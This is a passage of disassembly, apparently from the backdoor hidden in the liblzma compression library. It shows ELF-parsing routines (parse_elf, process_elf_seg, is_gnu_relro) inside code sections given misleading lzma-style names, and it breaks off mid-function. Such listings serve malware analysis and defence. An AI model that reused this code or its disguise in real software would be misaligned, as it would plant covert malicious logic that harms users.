.text.powerpc_coda:000000000000130E ; ---------------------------------------------------------------------------
.text.powerpc_coda:000000000000130E
.text.powerpc_coda:000000000000130E loc_130E:                               ; CODE XREF: process_elf_seg_next+C8↑j
.text.powerpc_coda:000000000000130E                                         ; process_elf_seg_next+CC↑j
.text.powerpc_coda:000000000000130E                 cmp     rsi, rbx
.text.powerpc_coda:0000000000001311                 jnb     short loc_132C
.text.powerpc_coda:0000000000001313                 test    r10b, r10b
.text.powerpc_coda:0000000000001316                 jz      short loc_132C
.text.powerpc_coda:0000000000001318                 cmp     rbx, r12
.text.powerpc_coda:000000000000131B                 jnb     short loc_1372
.text.powerpc_coda:000000000000131D                 lea     rsi, [rbx+1]
.text.powerpc_coda:0000000000001321                 mov     rdx, r12
.text.powerpc_coda:0000000000001324                 sub     rdx, rsi
.text.powerpc_coda:0000000000001327                 jmp     loc_1244
.text.powerpc_coda:000000000000132C ; ---------------------------------------------------------------------------
.text.powerpc_coda:000000000000132C
.text.powerpc_coda:000000000000132C loc_132C:                               ; CODE XREF: process_elf_seg_next+E1↑j
.text.powerpc_coda:000000000000132C                                         ; process_elf_seg_next+E6↑j
.text.powerpc_coda:000000000000132C                 cmp     rbx, r12
.text.powerpc_coda:000000000000132F                 jnb     short loc_1372
.text.powerpc_coda:0000000000001331                 test    al, al
.text.powerpc_coda:0000000000001333                 jz      short loc_1372
.text.powerpc_coda:0000000000001335                 sub     rdx, rsi
.text.powerpc_coda:0000000000001338                 mov     ecx, r14d
.text.powerpc_coda:000000000000133B                 mov     rdi, r13
.text.powerpc_coda:000000000000133E                 mov     [rsp+38h+var_2C], r8d
.text.powerpc_coda:0000000000001343                 call    process_elf_seg_next
.text.powerpc_coda:0000000000001348                 mov     r8d, [rsp+38h+var_2C]
.text.powerpc_coda:000000000000134D                 test    eax, eax
.text.powerpc_coda:000000000000134F                 jz      short loc_1383
.text.powerpc_coda:0000000000001351                 lea     rdx, [r12-1]
.text.powerpc_coda:0000000000001356                 lea     rsi, [rbx+1]
.text.powerpc_coda:000000000000135A                 mov     ecx, r14d
.text.powerpc_coda:000000000000135D                 mov     rdi, r13
.text.powerpc_coda:0000000000001360                 sub     rdx, rbx
.text.powerpc_coda:0000000000001363                 call    process_elf_seg_next
.text.powerpc_coda:0000000000001368                 test    eax, eax
.text.powerpc_coda:000000000000136A                 setnz   al
.text.powerpc_coda:000000000000136D                 movzx   eax, al
.text.powerpc_coda:0000000000001370                 jmp     short loc_1383
.text.powerpc_coda:0000000000001372 ; ---------------------------------------------------------------------------
.text.powerpc_coda:0000000000001372
.text.powerpc_coda:0000000000001372 loc_1372:                               ; CODE XREF: process_elf_seg_next+5F↑j
.text.powerpc_coda:0000000000001372                                         ; process_elf_seg_next+6E↑j ...
.text.powerpc_coda:0000000000001372                 inc     rdi
.text.powerpc_coda:0000000000001375                 jmp     loc_127B
.text.powerpc_coda:000000000000137A ; ---------------------------------------------------------------------------
.text.powerpc_coda:000000000000137A
.text.powerpc_coda:000000000000137A loc_137A:                               ; CODE XREF: process_elf_seg_next+31↑j
.text.powerpc_coda:000000000000137A                                         ; process_elf_seg_next+3E↑j ...
.text.powerpc_coda:000000000000137A                 xor     eax, eax
.text.powerpc_coda:000000000000137C                 jmp     short loc_1383
.text.powerpc_coda:000000000000137E ; ---------------------------------------------------------------------------
.text.powerpc_coda:000000000000137E
.text.powerpc_coda:000000000000137E loc_137E:                               ; CODE XREF: process_elf_seg_next+1E↑j
.text.powerpc_coda:000000000000137E                                         ; process_elf_seg_next+B9↑j
.text.powerpc_coda:000000000000137E                 mov     eax, 1
.text.powerpc_coda:0000000000001383
.text.powerpc_coda:0000000000001383 loc_1383:                               ; CODE XREF: process_elf_seg_next+11F↑j
.text.powerpc_coda:0000000000001383                                         ; process_elf_seg_next+140↑j ...
.text.powerpc_coda:0000000000001383                 add     rsp, 18h
.text.powerpc_coda:0000000000001387                 pop     rbx
.text.powerpc_coda:0000000000001388                 pop     r12
.text.powerpc_coda:000000000000138A                 pop     r13
.text.powerpc_coda:000000000000138C                 pop     r14
.text.powerpc_coda:000000000000138E                 retn
.text.powerpc_coda:000000000000138E process_elf_seg_next endp
.text.powerpc_coda:000000000000138E
.text.powerpc_coda:000000000000138E _text_powerpc_coda ends
.text.powerpc_coda:000000000000138E
.text.parse_bcz:0000000000001390 ; ===========================================================================
.text.parse_bcz:0000000000001390
.text.parse_bcz:0000000000001390 ; Segment type: Pure code
.text.parse_bcz:0000000000001390 ; Segment permissions: Read/Execute
.text.parse_bcz:0000000000001390 _text_parse_bcz segment para public 'CODE' use64
.text.parse_bcz:0000000000001390                 assume cs:_text_parse_bcz
.text.parse_bcz:0000000000001390                 ;org 1390h
.text.parse_bcz:0000000000001390                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.parse_bcz:0000000000001390
.text.parse_bcz:0000000000001390 ; =============== S U B R O U T I N E =======================================
.text.parse_bcz:0000000000001390
.text.parse_bcz:0000000000001390
.text.parse_bcz:0000000000001390 ; __int64 __fastcall process_elf_seg(struct_elf_info *a1, unsigned __int64 a2, unsigned __int64 a3, __int64 ptflags)
.text.parse_bcz:0000000000001390                 public process_elf_seg
.text.parse_bcz:0000000000001390 process_elf_seg proc near               ; CODE XREF: parse_elf+109↓p
.text.parse_bcz:0000000000001390                                         ; parse_elf+3CA↓p ...
.text.parse_bcz:0000000000001390                 endbr64
.text.parse_bcz:0000000000001394                 xor     r8d, r8d
.text.parse_bcz:0000000000001397                 jmp     process_elf_seg_next
.text.parse_bcz:0000000000001397 process_elf_seg endp
.text.parse_bcz:0000000000001397
.text.parse_bcz:0000000000001397 _text_parse_bcz ends
.text.parse_bcz:0000000000001397
.text.lzma_simple_props_sizd:00000000000013A0 ; ===========================================================================
.text.lzma_simple_props_sizd:00000000000013A0
.text.lzma_simple_props_sizd:00000000000013A0 ; Segment type: Pure code
.text.lzma_simple_props_sizd:00000000000013A0 ; Segment permissions: Read/Execute
.text.lzma_simple_props_sizd:00000000000013A0 _text_lzma_simple_props_sizd segment para public 'CODE' use64
.text.lzma_simple_props_sizd:00000000000013A0                 assume cs:_text_lzma_simple_props_sizd
.text.lzma_simple_props_sizd:00000000000013A0                 ;org 13A0h
.text.lzma_simple_props_sizd:00000000000013A0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_simple_props_sizd:00000000000013A0
.text.lzma_simple_props_sizd:00000000000013A0 ; =============== S U B R O U T I N E =======================================
.text.lzma_simple_props_sizd:00000000000013A0
.text.lzma_simple_props_sizd:00000000000013A0
.text.lzma_simple_props_sizd:00000000000013A0 ; _BOOL8 __fastcall is_gnu_relro(int, int)
.text.lzma_simple_props_sizd:00000000000013A0 is_gnu_relro    proc near               ; CODE XREF: parse_elf+8A↓p
.text.lzma_simple_props_sizd:00000000000013A0
.text.lzma_simple_props_sizd:00000000000013A0 var_4           = dword ptr -4
.text.lzma_simple_props_sizd:00000000000013A0
.text.lzma_simple_props_sizd:00000000000013A0                 endbr64
.text.lzma_simple_props_sizd:00000000000013A4                 mov     [rsp+var_4], 474E553h
.text.lzma_simple_props_sizd:00000000000013AC                 mov     eax, [rsp+var_4]
.text.lzma_simple_props_sizd:00000000000013B0                 lea     edx, [rdi+rsi+1]
.text.lzma_simple_props_sizd:00000000000013B4                 cmp     edx, eax
.text.lzma_simple_props_sizd:00000000000013B6                 setz    al
.text.lzma_simple_props_sizd:00000000000013B9                 movzx   eax, al
.text.lzma_simple_props_sizd:00000000000013BC                 retn
.text.lzma_simple_props_sizd:00000000000013BC is_gnu_relro    endp
.text.lzma_simple_props_sizd:00000000000013BC
.text.lzma_simple_props_sizd:00000000000013BC _text_lzma_simple_props_sizd ends
.text.lzma_simple_props_sizd:00000000000013BC
.text.get_literal_prica:00000000000013C0 ; ===========================================================================
.text.get_literal_prica:00000000000013C0
.text.get_literal_prica:00000000000013C0 ; Segment type: Pure code
.text.get_literal_prica:00000000000013C0 ; Segment permissions: Read/Execute
.text.get_literal_prica:00000000000013C0 _text_get_literal_prica segment para public 'CODE' use64
.text.get_literal_prica:00000000000013C0                 assume cs:_text_get_literal_prica
.text.get_literal_prica:00000000000013C0                 ;org 13C0h
.text.get_literal_prica:00000000000013C0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.get_literal_prica:00000000000013C0
.text.get_literal_prica:00000000000013C0 ; =============== S U B R O U T I N E =======================================
.text.get_literal_prica:00000000000013C0
.text.get_literal_prica:00000000000013C0
.text.get_literal_prica:00000000000013C0 ; __int64 __fastcall parse_elf(Elf64_Ehdr *elf_hdr, struct_elf_info *elf_info)
.text.get_literal_prica:00000000000013C0                 public parse_elf
.text.get_literal_prica:00000000000013C0 parse_elf       proc near               ; CODE XREF: parse_elf_invoke+16↓p
.text.get_literal_prica:00000000000013C0                                         ; _Llzma_index_buffer_encode_0+28↓p ...
.text.get_literal_prica:00000000000013C0
.text.get_literal_prica:00000000000013C0 dyn_length      = dword ptr -2Ch
.text.get_literal_prica:00000000000013C0
.text.get_literal_prica:00000000000013C0                 endbr64
.text.get_literal_prica:00000000000013C4                 test    rdi, rdi
.text.get_literal_prica:00000000000013C7                 jz      loc_185E
.text.get_literal_prica:00000000000013CD                 push    r15
.text.get_literal_prica:00000000000013CF                 push    r14
.text.get_literal_prica:00000000000013D1                 push    r13
.text.get_literal_prica:00000000000013D3                 push    r12
.text.get_literal_prica:00000000000013D5                 push    rbx
.text.get_literal_prica:00000000000013D6                 mov     rbx, rsi
.text.get_literal_prica:00000000000013D9                 sub     rsp, 10h
.text.get_literal_prica:00000000000013DD                 test    rsi, rsi
.text.get_literal_prica:00000000000013E0                 jz      loc_1524
.text.get_literal_prica:00000000000013E6                 lea     rdx, [rsi+8]
.text.get_literal_prica:00000000000013EA                 mov     r12, rdi
.text.get_literal_prica:00000000000013ED                 mov     ecx, 3Eh ; '>'
.text.get_literal_prica:00000000000013F2                 xor     eax, eax
.text.get_literal_prica:00000000000013F4                 mov     rdi, rdx
.text.get_literal_prica:00000000000013F7                 or      r9, 0FFFFFFFFFFFFFFFFh
.text.get_literal_prica:00000000000013FB                 xor     r13d, r13d
.text.get_literal_prica:00000000000013FE                 rep stosd
.text.get_literal_prica:0000000000001400                 mov     [rsi], r12
.text.get_literal_prica:0000000000001403                 or      rcx, 0FFFFFFFFFFFFFFFFh
.text.get_literal_prica:0000000000001407                 mov     r8, [r12+20h]
.text.get_literal_prica:000000000000140C                 movzx   r11d, word ptr [r12+38h]
.text.get_literal_prica:0000000000001412                 add     r8, r12
.text.get_literal_prica:0000000000001415                 mov     [rsi+18h], r11w
.text.get_literal_prica:000000000000141A                 mov     [rsi+10h], r8
.text.get_literal_prica:000000000000141E                 mov     r10, r8
.text.get_literal_prica:0000000000001421
.text.get_literal_prica:0000000000001421 loc_1421:                               ; CODE XREF: parse_elf+BB↓j
.text.get_literal_prica:0000000000001421                 cmp     r13d, r11d
.text.get_literal_prica:0000000000001424                 jnb     short loc_147D
.text.get_literal_prica:0000000000001426                 mov     edi, [r10]
.text.get_literal_prica:0000000000001429                 cmp     edi, 1
.text.get_literal_prica:000000000000142C                 jnz     short loc_143B
.text.get_literal_prica:000000000000142E                 mov     rax, [r10+10h]
.text.get_literal_prica:0000000000001432                 cmp     r9, rax
.text.get_literal_prica:0000000000001435                 cmova   r9, rax
.text.get_literal_prica:0000000000001439                 jmp     short loc_1474
.text.get_literal_prica:000000000000143B ; ---------------------------------------------------------------------------
.text.get_literal_prica:000000000000143B
.text.get_literal_prica:000000000000143B loc_143B:                               ; CODE XREF: parse_elf+6C↑j
.text.get_literal_prica:000000000000143B                 cmp     edi, 2
.text.get_literal_prica:000000000000143E                 jnz     short loc_1445
.text.get_literal_prica:0000000000001440                 movsxd  rcx, r13d
.text.get_literal_prica:0000000000001443                 jmp     short loc_1474
.text.get_literal_prica:0000000000001445 ; ---------------------------------------------------------------------------
.text.get_literal_prica:0000000000001445
.text.get_literal_prica:0000000000001445 loc_1445:                               ; CODE XREF: parse_elf+7E↑j
.text.get_literal_prica:0000000000001445                 mov     esi, 0A0000000h
.text.get_literal_prica:000000000000144A                 call    is_gnu_relro    ; PIC mode
.text.get_literal_prica:000000000000144F                 test    eax, eax
.text.get_literal_prica:0000000000001451                 jz      short loc_1474
.text.get_literal_prica:0000000000001453                 cmp     dword ptr [rbx+4Ch], 0
.text.get_literal_prica:0000000000001457                 jnz     loc_1524
.text.get_literal_prica:000000000000145D                 mov     rax, [r10+10h]
.text.get_literal_prica:0000000000001461                 mov     [rbx+50h], rax
.text.get_literal_prica:0000000000001465                 mov     rax, [r10+28h]
.text.get_literal_prica:0000000000001469                 mov     dword ptr [rbx+4Ch], 1
.text.get_literal_prica:0000000000001470                 mov     [rbx+58h], rax
.text.get_literal_prica:0000000000001474
.text.get_literal_prica:0000000000001474 loc_1474:                               ; CODE XREF: parse_elf+79↑j
.text.get_literal_prica:0000000000001474                                         ; parse_elf+83↑j ...
.text.get_literal_prica:0000000000001474                 inc     r13d
.text.get_literal_prica:0000000000001477                 add     r10, 38h ; '8'
.text.get_literal_prica:000000000000147B                 jmp     short loc_1421
.text.get_literal_prica:000000000000147D ; ---------------------------------------------------------------------------
.text.get_literal_prica:000000000000147D
.text.get_literal_prica:000000000000147D loc_147D:                               ; CODE XREF: parse_elf+64↑j
.text.get_literal_prica:000000000000147D                 cmp     r9, 0FFFFFFFFFFFFFFFFh
.text.get_literal_prica:0000000000001481                 jz      loc_1524
.text.get_literal_prica:0000000000001487                 cmp     ecx, 0FFFFFFFFh
.text.get_literal_prica:000000000000148A                 jz      loc_1524
.text.get_literal_prica:0000000000001490                 imul    rcx, 38h ; '8'
.text.get_literal_prica:0000000000001494                 mov     rax, r12
.text.get_literal_prica:0000000000001497                 mov     [rbx+8], r9
.text.get_literal_prica:000000000000149B                 mov     rdi, rbx
.text.get_literal_prica:000000000000149E                 sub     rax, r9
.text.get_literal_prica:00000000000014A1                 add     r8, rcx
.text.get_literal_prica:00000000000014A4                 mov     ecx, 4
.text.get_literal_prica:00000000000014A9                 mov     rdx, [r8+28h]
.text.get_literal_prica:00000000000014AD                 add     rax, [r8+10h]
.text.get_literal_prica:00000000000014B1                 mov     r13, rax
.text.get_literal_prica:00000000000014B4                 mov     [rbx+20h], rax
.text.get_literal_prica:00000000000014B8                 mov     rax, rdx
.text.get_literal_prica:00000000000014BB                 mov     rsi, r13
.text.get_literal_prica:00000000000014BE                 shr     rax, 4
.text.get_literal_prica:00000000000014C2                 mov     [rbx+28h], eax
.text.get_literal_prica:00000000000014C5                 mov     [rsp+38h+dyn_length], eax
.text.get_literal_prica:00000000000014C9                 call    process_elf_seg ; PIC mode
.text.get_literal_prica:00000000000014CE                 test    eax, eax
.text.get_literal_prica:00000000000014D0                 jz      short loc_1524
.text.get_literal_prica:00000000000014D2                 lea     rax, [r13+8]
.text.get_literal_prica:00000000000014D6                 xor     edi, edi
.text.get_literal_prica:00000000000014D8                 or      r13, 0FFFFFFFFFFFFFFFFh
.text.get_literal_prica:00000000000014DC                 or      r14, 0FFFFFFFFFFFFFFFFh
.text.get_literal_prica:00000000000014E0                 or      rsi, 0FFFFFFFFFFFFFFFFh
.text.get_literal_prica:00000000000014E4                 xor     r15d, r15d
.text.get_literal_prica:00000000000014E7                 lea     r9, jpt_156D
.text.get_literal_prica:00000000000014EE                 xor     ecx, ecx
.text.get_literal_prica:00000000000014F0                 lea     r10, jpt_1577
.text.get_literal_prica:00000000000014F7                 jmp     short loc_1541
.text.get_literal_prica:00000000000014F9 ; ---------------------------------------------------------------------------
.text.get_literal_prica:00000000000014F9
.text.get_literal_prica:00000000000014F9 loc_14F9:                               ; CODE XREF: parse_elf+192↓j
.text.get_literal_prica:00000000000014F9                 cmp     rdx, 24h ; '$'
.text.get_literal_prica:00000000000014FD                 jle     short loc_152B
.text.get_literal_prica:00000000000014FF                 cmp     rdx, 6FFFFFFBh
.text.get_literal_prica:0000000000001506                 jz      loc_163D
.text.get_literal_prica:000000000000150C                 jg      loc_15A1
.text.get_literal_prica:0000000000001512                 cmp     rdx, 6FFFFEFCh
.text.get_literal_prica:0000000000001519                 jg      short loc_1588
.text.get_literal_prica:000000000000151B                 cmp     rdx, 6FFFFEFAh
.text.get_literal_prica:0000000000001522                 jle     short loc_157A
.text.get_literal_prica:0000000000001524
.text.get_literal_prica:0000000000001524 loc_1524:                               ; CODE XREF: parse_elf+20↑j
.text.get_literal_prica:0000000000001524                                         ; parse_elf+97↑j ...
.text.get_literal_prica:0000000000001524                 xor     eax, eax
.text.get_literal_prica:0000000000001526                 jmp     loc_1850
.text.get_literal_prica:000000000000152B ; ---------------------------------------------------------------------------
.text.get_literal_prica:000000000000152B
.text.get_literal_prica:000000000000152B loc_152B:                               ; CODE XREF: parse_elf+13D↑j
.text.get_literal_prica:000000000000152B                 cmp     rdx, 16h
.text.get_literal_prica:000000000000152F                 jg      short loc_155C
.text.get_literal_prica:0000000000001531                 sub     rdx, 2          ; switch 7 cases
.text.get_literal_prica:0000000000001535                 cmp     rdx, 6
.text.get_literal_prica:0000000000001539                 jbe     short loc_1570
.text.get_literal_prica:000000000000153B
.text.get_literal_prica:000000000000153B def_156D:                               ; CODE XREF: parse_elf+1A4↓j
.text.get_literal_prica:000000000000153B                                         ; parse_elf+1AD↓j ...
.text.get_literal_prica:000000000000153B                 inc     ecx             ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:000000000000153B                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:000000000000153D                 add     rax, 10h
.text.get_literal_prica:0000000000001541
.text.get_literal_prica:0000000000001541 loc_1541:                               ; CODE XREF: parse_elf+137↑j
.text.get_literal_prica:0000000000001541                 cmp     [rsp+38h+dyn_length], ecx
.text.get_literal_prica:0000000000001545                 jz      loc_1652
.text.get_literal_prica:000000000000154B                 mov     rdx, [rax-8]
.text.get_literal_prica:000000000000154F                 test    rdx, rdx
.text.get_literal_prica:0000000000001552                 jnz     short loc_14F9
.text.get_literal_prica:0000000000001554                 mov     [rbx+28h], ecx
.text.get_literal_prica:0000000000001557                 jmp     loc_1652
.text.get_literal_prica:000000000000155C ; ---------------------------------------------------------------------------
.text.get_literal_prica:000000000000155C
.text.get_literal_prica:000000000000155C loc_155C:                               ; CODE XREF: parse_elf+16F↑j
.text.get_literal_prica:000000000000155C                 sub     rdx, 17h        ; switch 14 cases
.text.get_literal_prica:0000000000001560                 cmp     rdx, 0Dh
.text.get_literal_prica:0000000000001564                 ja      short def_156D  ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:0000000000001564                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:0000000000001566                 movsxd  rdx, ds:(jpt_156D - 0ADC0h)[r9+rdx*4]
.text.get_literal_prica:000000000000156A                 add     rdx, r9
.text.get_literal_prica:000000000000156D                 db      3Eh             ; switch jump
.text.get_literal_prica:000000000000156D                 jmp     rdx
.text.get_literal_prica:0000000000001570 ; ---------------------------------------------------------------------------
.text.get_literal_prica:0000000000001570
.text.get_literal_prica:0000000000001570 loc_1570:                               ; CODE XREF: parse_elf+179↑j
.text.get_literal_prica:0000000000001570                 movsxd  rdx, ds:(jpt_1577 - 0ADF8h)[r10+rdx*4]
.text.get_literal_prica:0000000000001574                 add     rdx, r10
.text.get_literal_prica:0000000000001577                 db      3Eh             ; switch jump
.text.get_literal_prica:0000000000001577                 jmp     rdx
.text.get_literal_prica:000000000000157A ; ---------------------------------------------------------------------------
.text.get_literal_prica:000000000000157A
.text.get_literal_prica:000000000000157A loc_157A:                               ; CODE XREF: parse_elf+162↑j
.text.get_literal_prica:000000000000157A                 cmp     rdx, 6FFFFEF5h
.text.get_literal_prica:0000000000001581                 jnz     short def_156D  ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:0000000000001581                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:0000000000001583                 mov     r15, [rax]
.text.get_literal_prica:0000000000001586                 jmp     short def_156D  ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:0000000000001586                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:0000000000001588 ; ---------------------------------------------------------------------------
.text.get_literal_prica:0000000000001588
.text.get_literal_prica:0000000000001588 loc_1588:                               ; CODE XREF: parse_elf+159↑j
.text.get_literal_prica:0000000000001588                 cmp     rdx, 6FFFFFF0h
.text.get_literal_prica:000000000000158F                 jnz     short def_156D  ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:000000000000158F                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:0000000000001591                 mov     rdx, [rax]
.text.get_literal_prica:0000000000001594                 or      byte ptr [rbx+0D0h], 10h
.text.get_literal_prica:000000000000159B                 mov     [rbx+70h], rdx
.text.get_literal_prica:000000000000159F                 jmp     short def_156D  ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:000000000000159F                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:00000000000015A1 ; ---------------------------------------------------------------------------
.text.get_literal_prica:00000000000015A1
.text.get_literal_prica:00000000000015A1 loc_15A1:                               ; CODE XREF: parse_elf+14C↑j
.text.get_literal_prica:00000000000015A1                 cmp     rdx, 6FFFFFFDh
.text.get_literal_prica:00000000000015A8                 jz      short loc_1627
.text.get_literal_prica:00000000000015AA                 cmp     rdx, 7FFFFFFFh
.text.get_literal_prica:00000000000015B1                 jz      loc_1524
.text.get_literal_prica:00000000000015B7                 cmp     rdx, 6FFFFFFCh
.text.get_literal_prica:00000000000015BE                 jnz     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:00000000000015BE                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:00000000000015C4                 mov     rdx, [rax]
.text.get_literal_prica:00000000000015C7                 mov     [rbx+60h], rdx
.text.get_literal_prica:00000000000015CB                 jmp     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:00000000000015CB                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:00000000000015D0 ; ---------------------------------------------------------------------------
.text.get_literal_prica:00000000000015D0
.text.get_literal_prica:00000000000015D0 loc_15D0:                               ; CODE XREF: parse_elf+1B7↑j
.text.get_literal_prica:00000000000015D0                                         ; DATA XREF: .rodata.get_literal_prica:jpt_1577↓o
.text.get_literal_prica:00000000000015D0                 mov     rdx, [rax]      ; jumptable 0000000000001577 case 5
.text.get_literal_prica:00000000000015D3                 mov     [rbx+30h], rdx
.text.get_literal_prica:00000000000015D7                 jmp     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:00000000000015D7                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:00000000000015DC ; ---------------------------------------------------------------------------
.text.get_literal_prica:00000000000015DC
.text.get_literal_prica:00000000000015DC loc_15DC:                               ; CODE XREF: parse_elf+1B7↑j
.text.get_literal_prica:00000000000015DC                                         ; DATA XREF: .rodata.get_literal_prica:jpt_1577↓o
.text.get_literal_prica:00000000000015DC                 mov     rdx, [rax]      ; jumptable 0000000000001577 case 6
.text.get_literal_prica:00000000000015DF                 mov     [rbx+38h], rdx
.text.get_literal_prica:00000000000015E3                 jmp     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:00000000000015E3                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:00000000000015E8 ; ---------------------------------------------------------------------------
.text.get_literal_prica:00000000000015E8
.text.get_literal_prica:00000000000015E8 loc_15E8:                               ; CODE XREF: parse_elf+1AD↑j
.text.get_literal_prica:00000000000015E8                                         ; DATA XREF: .rodata.get_literal_prica:jpt_156D↓o
.text.get_literal_prica:00000000000015E8                 mov     rdx, [rax]      ; jumptable 000000000000156D case 23
.text.get_literal_prica:00000000000015EB                 mov     [rbx+40h], rdx
.text.get_literal_prica:00000000000015EF                 jmp     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:00000000000015EF                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:00000000000015F4 ; ---------------------------------------------------------------------------
.text.get_literal_prica:00000000000015F4
.text.get_literal_prica:00000000000015F4 loc_15F4:                               ; CODE XREF: parse_elf+1B7↑j
.text.get_literal_prica:00000000000015F4                                         ; DATA XREF: .rodata.get_literal_prica:jpt_1577↓o
.text.get_literal_prica:00000000000015F4                 mov     rdx, [rax]      ; jumptable 0000000000001577 case 7
.text.get_literal_prica:00000000000015F7                 mov     [rbx+78h], rdx
.text.get_literal_prica:00000000000015FB                 jmp     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:00000000000015FB                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:0000000000001600 ; ---------------------------------------------------------------------------
.text.get_literal_prica:0000000000001600
.text.get_literal_prica:0000000000001600 loc_1600:                               ; CODE XREF: parse_elf+1AD↑j
.text.get_literal_prica:0000000000001600                                         ; DATA XREF: .rodata.get_literal_prica:jpt_156D↓o
.text.get_literal_prica:0000000000001600                 mov     rdx, [rax]      ; jumptable 000000000000156D case 36
.text.get_literal_prica:0000000000001603                 mov     [rbx+88h], rdx
.text.get_literal_prica:000000000000160A                 jmp     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:000000000000160A                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:000000000000160F ; ---------------------------------------------------------------------------
.text.get_literal_prica:000000000000160F
.text.get_literal_prica:000000000000160F loc_160F:                               ; CODE XREF: parse_elf+1B7↑j
.text.get_literal_prica:000000000000160F                                         ; DATA XREF: .rodata.get_literal_prica:jpt_1577↓o
.text.get_literal_prica:000000000000160F                 mov     rsi, [rax]      ; jumptable 0000000000001577 case 2
.text.get_literal_prica:0000000000001612                 jmp     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:0000000000001612                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:0000000000001617 ; ---------------------------------------------------------------------------
.text.get_literal_prica:0000000000001617
.text.get_literal_prica:0000000000001617 loc_1617:                               ; CODE XREF: parse_elf+1B7↑j
.text.get_literal_prica:0000000000001617                                         ; DATA XREF: .rodata.get_literal_prica:jpt_1577↓o
.text.get_literal_prica:0000000000001617                 mov     r14, [rax]      ; jumptable 0000000000001577 case 8
.text.get_literal_prica:000000000000161A                 jmp     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:000000000000161A                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:000000000000161F ; ---------------------------------------------------------------------------
.text.get_literal_prica:000000000000161F
.text.get_literal_prica:000000000000161F loc_161F:                               ; CODE XREF: parse_elf+1AD↑j
.text.get_literal_prica:000000000000161F                                         ; DATA XREF: .rodata.get_literal_prica:jpt_156D↓o
.text.get_literal_prica:000000000000161F                 mov     r13, [rax]      ; jumptable 000000000000156D case 35
.text.get_literal_prica:0000000000001622                 jmp     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:0000000000001622                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:0000000000001627 ; ---------------------------------------------------------------------------
.text.get_literal_prica:0000000000001627
.text.get_literal_prica:0000000000001627 loc_1627:                               ; CODE XREF: parse_elf+1E8↑j
.text.get_literal_prica:0000000000001627                 mov     rdx, [rax]
.text.get_literal_prica:000000000000162A                 mov     edi, 1
.text.get_literal_prica:000000000000162F                 mov     [rbx+68h], rdx
.text.get_literal_prica:0000000000001633                 jmp     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:0000000000001633                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:0000000000001638 ; ---------------------------------------------------------------------------
.text.get_literal_prica:0000000000001638
.text.get_literal_prica:0000000000001638 loc_1638:                               ; CODE XREF: parse_elf+1AD↑j
.text.get_literal_prica:0000000000001638                                         ; DATA XREF: .rodata.get_literal_prica:jpt_156D↓o
.text.get_literal_prica:0000000000001638                 test    byte ptr [rax], 8 ; jumptable 000000000000156D case 30
.text.get_literal_prica:000000000000163B                 jmp     short loc_1640
.text.get_literal_prica:000000000000163D ; ---------------------------------------------------------------------------
.text.get_literal_prica:000000000000163D
.text.get_literal_prica:000000000000163D loc_163D:                               ; CODE XREF: parse_elf+146↑j
.text.get_literal_prica:000000000000163D                 test    byte ptr [rax], 1
.text.get_literal_prica:0000000000001640
.text.get_literal_prica:0000000000001640 loc_1640:                               ; CODE XREF: parse_elf+27B↑j
.text.get_literal_prica:0000000000001640                 jz      def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:0000000000001640                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:0000000000001646
.text.get_literal_prica:0000000000001646 loc_1646:                               ; CODE XREF: parse_elf+1AD↑j
.text.get_literal_prica:0000000000001646                                         ; DATA XREF: .rodata.get_literal_prica:jpt_156D↓o
.text.get_literal_prica:0000000000001646                 or      byte ptr [rbx+0D0h], 20h ; jumptable 000000000000156D case 24
.text.get_literal_prica:000000000000164D                 jmp     def_156D        ; jumptable 000000000000156D default case, cases 25-29,31-34
.text.get_literal_prica:000000000000164D                                         ; jumptable 0000000000001577 default case, cases 3,4
.text.get_literal_prica:0000000000001652 ; ---------------------------------------------------------------------------
.text.get_literal_prica:0000000000001652
.text.get_literal_prica:0000000000001652 loc_1652:                               ; CODE XREF: parse_elf+185↑j
